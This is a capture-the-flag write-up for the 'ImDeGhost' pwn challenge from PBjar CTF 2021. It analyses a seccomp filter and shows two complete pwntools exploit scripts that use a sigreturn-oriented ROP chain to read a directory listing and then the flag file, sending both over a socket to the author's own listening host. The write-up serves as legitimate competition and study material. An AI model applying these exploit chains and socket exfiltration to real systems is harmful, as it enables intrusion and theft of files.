## ImDeGhost

> Points: ?
>
> Solves: 4

### Description:
Are you afraid of ghosts? Warning: The flag is not the usual "flag.txt" file. Instead, it is in a file with a name format of a length 16 binary string of 0's and 1's in the current directory. An example of this format is "0101010110101010". Connect with "nc 143.198.127.103 42007".

Author: Rythm

### Attachments:
```
imdeghost.zip
```

## Analysis:

When I checked with the author after the competition, my solution was not an assumed solution, but I was able to solve it in a simpler way than the assumed solution.

Regarding the shellcode challenge caused by ROP, the system calls of `mmap, mprotect, execve, remap_file_pages, execveat, and pkey_mprotect` were prohibited by seccomp. 

```
$ seccomp-tools dump ./imdeghost 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x06 0x00 0x00000009  if (A == mmap) goto 0012
 0006: 0x15 0x05 0x00 0x0000000a  if (A == mprotect) goto 0012
 0007: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0012
 0008: 0x15 0x03 0x00 0x000000d8  if (A == remap_file_pages) goto 0012
 0009: 0x15 0x02 0x00 0x00000142  if (A == execveat) goto 0012
 0010: 0x15 0x01 0x00 0x00000149  if (A == pkey_mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```
The code execution area is `0x133700000000` and the stack area is `0x6900000000`.

Since you can only enter the stack area, we need to write shellcode only with ROP.

Since the PIE address cannot be obtained, only the following instructions of `0x133700000000` can be used with the ROP gadget.
For this reason, ROP gadgets that pop to registers such as `pop rdi; ret` could not be used.

```
=> 0x133700000000:	mov    r15,rdi
   0x133700000003:	xor    rax,rax
   0x133700000006:	xor    rbx,rbx
   0x133700000009:	xor    rcx,rcx
   0x13370000000c:	xor    rdx,rdx
   0x13370000000f:	xor    rdi,rdi
   0x133700000012:	xor    rsi,rsi
   0x133700000015:	xor    rbp,rbp
   0x133700000018:	xor    r8,r8
   0x13370000001b:	xor    r9,r9
   0x13370000001e:	xor    r10,r10
   0x133700000021:	xor    r11,r11
   0x133700000024:	xor    r12,r12
   0x133700000027:	xor    r13,r13
   0x13370000002a:	xor    r14,r14
   0x13370000002d:	movabs rsp,0x6900000000
   0x133700000037:	mov    r14,0x3
   0x13370000003e:	dec    r14
   0x133700000041:	mov    rdi,r14
   0x133700000044:	mov    rax,0x3
   0x13370000004b:	syscall 　　　　　　　　<= Mainly used ROP gadget
   0x13370000004d:	test   r14,r14
   0x133700000050:	jne    0x13370000003e
   0x133700000052:	mov    rax,r15
   0x133700000055:	ret    
```

Also, since the standard input, standard output, and standard error output are closed at the end of the above code, the flag cannot be output to the standard output.

Furthermore, the file name of the flag is a file name such as `0101010110101010`, so I had to get the file name somehow first.

## Solution:

The ROP gadgets available are limited, but I've found that I can call any system call using the ROP gadgets below.

In order to call any system call, I need to set an arbitrary value in the r15 register, but the 256 remainder of the first input size goes into r15.
```
   0x13370000004b:	syscall
   0x13370000004d:	test   r14,r14
   0x133700000050:	jne    0x13370000003e
   0x133700000052:	mov    rax,r15
   0x133700000055:	ret
```

I used `sys_rt_sigreturn (15)` as a way to set the value in each register.
`sys_rt_sigreturn (15)` can be read from the stack and set to all registers.

By calling the system calls in the following order while using `sys_rt_sigreturn (15)`, the file name could be output to the local environment.

```
- sys_open("./", 0, 0x200000)
- sys_getdents(0, mem+0xb00, 0x300)
- sys_socket(2, 1, 6)
- sys_connect(1, mem+0xe80, 0x10)
- sys_write(1, mem+0xb00, 0x300)
```

The file name was `0101111001001101`.

Similarly, by calling the system calls in the following order, the flags could be output to the local environment.

```
- sys_open("./", 0, 0x200000)
- sys_read(0, mem+0xb00, 0x300)
- sys_socket(2, 1, 6)
- sys_connect(1, mem+0xe80, 0x10)
- sys_write(1, mem+0xb00, 0x300)
```

The assumed solution is to open `/proc/self/mem` and write the execution code directly in the area of `0x133700000000` using `sys_pwrite64 (18)` without using `sys_getdents (78)`.
See below for details.
https://github.com/pbjar/Challenges/blob/main/Pwn/imdeghost/imdeghost.py

Thanks to Rythm for the interesting challenges and post-competition supports.

## Exploit code:
Python code to get the file name (If you get it from the server, you need to set NAT etc on your router.)
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './imdeghost'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42007
  s = remote(HOST, PORT)
  ip_addr = 0xbe409f76  
else:
  s = process(BINARY)
  libc = elf.libc
  ip_addr = 0x0100007f  # 127.0.0.1 

s.recvuntil("for you will not be seeing it again.\n")

mem         = 0x6900000000
syscall_ret = 0x13370000004b # syscall; test r14,r14; jne 0x13370000003e; mov rax,r15; ret

def Sigreturn(rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8, r9, r10, r11, r12, r13, r14, r15):
  buf  = p64(0)*5
  buf += p64(r8) + p64(r9) + p64(r10) + p64(r11) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
  buf += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx) + p64(rdx) + p64(rax) + p64(rcx) + p64(rsp) + p64(rip)
  buf += p64(0) + p64(0x33) + b"AAAAAAAA"*4 + p64(0)
  return buf

mem = 0x6900000000

buf  = p64(syscall_ret)
# sys_open("./", 0, 0x200000)
buf += Sigreturn(2, 0, 0, 0x200000, 0, mem + 0xe00, mem + 0x170, mem + 0xf0, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_getdents(0, mem+0xb00, 0x300)
buf += Sigreturn(78, 0, 0, 0x300, mem + 0xb00, 0, mem + 0x170, mem + 0xf0*2, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_socket(2, 1, 6)
buf += Sigreturn(0x29, 0, 0, 6, 1, 2, mem + 0x170, mem + 0xf0*3, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_connect(1, mem+0xe80, 0x10)
buf += Sigreturn(0x2a, 0, 0, 0x10, mem + 0xe80, 1, mem + 0x170, mem + 0xf0*4, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_write(1, mem+0xb00, 0x300)
buf += Sigreturn(1, 0, 0, 0x300, mem + 0xb00, 1, mem + 0x170, mem + 0xf0*5, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

buf += b"A"*(0xe00-len(buf))
buf += b"./\x00"
buf += b"A"*(0xe80-len(buf))
buf += p32(0x55550002) + p32(ip_addr)
buf += b"A"*(0xf00+15-len(buf))
#pause()
s.send(buf)

s.interactive()
```

Python code to get the flag file (If you get it from the server, you need to set NAT etc on your router.)
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './imdeghost'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42007
  s = remote(HOST, PORT)
  ip_addr = 0xbe409f76  
else:
  s = process(BINARY)
  libc = elf.libc
  ip_addr = 0x0100007f  # 127.0.0.1 

s.recvuntil("for you will not be seeing it again.\n")

mem         = 0x6900000000
syscall_ret = 0x13370000004b # syscall; test r14,r14; jne 0x13370000003e; mov rax,r15; ret

def Sigreturn(rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8, r9, r10, r11, r12, r13, r14, r15):
  buf  = p64(0)*5
  buf += p64(r8) + p64(r9) + p64(r10) + p64(r11) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
  buf += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx) + p64(rdx) + p64(rax) + p64(rcx) + p64(rsp) + p64(rip)
  buf += p64(0) + p64(0x33) + b"AAAAAAAA"*4 + p64(0)
  return buf

buf  = p64(syscall_ret)
# sys_open("./0101111001001101\", 0, 0)
buf += Sigreturn(2, 0, 0, 0, 0, mem + 0xe00, mem + 0x170, mem + 0xf0, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_read(0, mem+0xb00, 0x300)
buf += Sigreturn(0, 0, 0, 0x300, mem + 0xb00, 0, mem + 0x170, mem + 0xf0*2, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_socket(2, 1, 6)
buf += Sigreturn(0x29, 0, 0, 6, 1, 2, mem + 0x170, mem + 0xf0*3, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_connect(1, mem+0xe80, 0x10)
buf += Sigreturn(0x2a, 0, 0, 0x10, mem + 0xe80, 1, mem + 0x170, mem + 0xf0*4, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_write(1, mem + 0xb00, 0x300)
buf += Sigreturn(1, 0, 0, 0x300, mem + 0xb00, 1, mem + 0x170, mem + 0xf0*5, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

buf += b"A"*(0xe00-len(buf))
buf += b"./0101111001001101\x00"
buf += b"A"*(0xe80-len(buf))
buf += p32(0x55550002) + p32(ip_addr)
buf += b"A"*(0xf00+15-len(buf))
#pause()
s.send(buf)

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost$ python3 solve_filename.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost/imdeghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42007: Done
[*] Switching to interactive mode
Boo.

mito@ubuntu:~/Desktop$ nc -lp 21845
...
dockerenvAN(0101111001001101AAAAAA...
```

```bash
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost$ python3 solve_flag.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost/imdeghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42007: Done
[*] Switching to interactive mode
Boo.

mito@ubuntu:~/Desktop$ nc -lp 21845
flag{aAaaaaAaaAAaAAAAaAAaAAAAaaAaaaaA}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

## Reference:

http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

https://inaz2.hatenablog.com/entry/2014/07/30/021123
